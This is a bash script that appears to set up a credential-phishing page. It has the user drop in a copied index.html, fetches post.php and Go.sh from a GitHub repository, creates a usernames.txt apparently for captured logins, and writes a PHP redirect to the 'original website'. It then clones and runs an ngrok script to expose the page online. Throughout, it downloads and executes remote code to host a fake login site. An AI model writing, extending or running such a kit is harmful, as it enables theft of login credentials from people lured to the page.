wcho "Choose your device: "
echo "1. Phone"
echo "2. Computer"
read -r device
if [ $device == "1" ]; then
loc="/sdcard"
else
loc="/mnt/d"
fi
echo
echo
echo "Website Name: "
read -r website
if [ ! -e "$HOME/web" ]; then
cd ~ && mkdir web
else
echo "Fine! web folder existed in kali's files.."
fi
echo
if [ ! -e "$loc/web" ]; then
cd $loc/ && mkdir web
else
echo "Fine! web folder existed in D drive"
fi
if [ -e "$loc/web/$website" ]; then 
echo "Fine! $website folder existed"
else
cd $loc/web && mkdir "$website"
fi
echo "      Put your index.html inside web/$website folder" 
echo " Press Y if already inserted else press N"
read -p $"  Yes / No:  " option
if [[ $option == "Y" || $option == "y" ]]; then
cd $loc/web/$website
git clone https://github.com/NganDii/webmakerfiles
cd webmakerfiles
cp Go.sh post.php $loc/web/$website
cd ..
rm -rf webmakerfiles
cat <<EOF>run.sh
cd $HOME/web/$website && bash Go.sh
EOF
cat <<EOF>usernames.txt
EOF
echo "Enter the original website link"
read -r ori
cat <<EOF>location.php
<?php
header ('Location: $ori');
?>
EOF
cd $loc/web/
rm -rf ~/web/$website
cp -r $loc/web/$website ~/web
cd ~
else
echo "Add files in /web/$website and come back again"
exit 1
fi
if [ ! -e "$HOME/ngrok" ]; then
git clone https://github.com/NganDii/remngrok
cd remngrok && bash ngrok.sh
fi
cd ~
cp -R ngrok web/$website
cd web/$website
chmod +x * 
bash run.sh
echo ""
